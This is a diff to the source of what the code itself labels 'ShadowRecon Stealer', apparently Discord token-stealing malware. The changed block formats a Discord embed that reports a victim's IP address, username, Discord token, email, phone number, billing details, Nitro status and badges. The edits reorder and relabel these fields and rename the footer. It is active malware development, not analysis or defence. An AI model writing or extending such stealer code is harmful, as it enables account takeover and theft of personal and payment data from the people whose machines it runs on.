@@ -596,41 +596,41 @@ This file indicates that the Discord module found tokens but couldn't process th
             color: null,
             fields: [
                 {
-                    name: "Username:",
-                    value: `\`${account.username}\``,
-                    inline: true
-                },
-                {
-                    name: ":earth_africa: IP:",
+                    name: ":earth_africa: IP",
                     value: `\`${ip}\``,
                     inline: true
                 },
                 {
-                    name: ":gem: Token:",
+                    name: ":mag_right:  Username",
+                    value: `\`${account.username}\``,
+                    inline: true
+                },
+                {
+                    name: ":gem: Token",
                     value: `\`${account.token}\``
                 },
                 {
-                    name: ":e_mail: Email:",
+                    name: ":e_mail: Email",
                     value: `\`${account.email || 'N/A'}\``,
                     inline: true
                 },
                 {
-                    name: ":mobile_phone: Phone:",
+                    name: ":mobile_phone: Phone",
                     value: `\`${account.phone || 'N/A'}\``,
                     inline: true
                 },
                 {
-                    name: ":credit_card: Billing:",
+                    name: ":credit_card: Billing",
                     value: `\`${billing}\``,
                     inline: true
                 },
                 {
-                    name: ":money_with_wings: Nitro:",
+                    name: ":money_with_wings: Nitro",
                     value: `\`${account.nitro || 'None'}\``,
                     inline: true
                 },
                 {
-                    name: ":package: Badges:",
+                    name: ":package: Badges",
                     value: `\`${badges}\``,
                     inline: true
                 }
@@ -640,7 +640,7 @@ This file indicates that the Discord module found tokens but couldn't process th
                 icon_url: avatarUrl
             },
             footer: {
-                text: "ShadowRecon"
+                text: "ShadowRecon Stealer"
             },
             timestamp: new Date().toISOString(),
             thumbnail: {
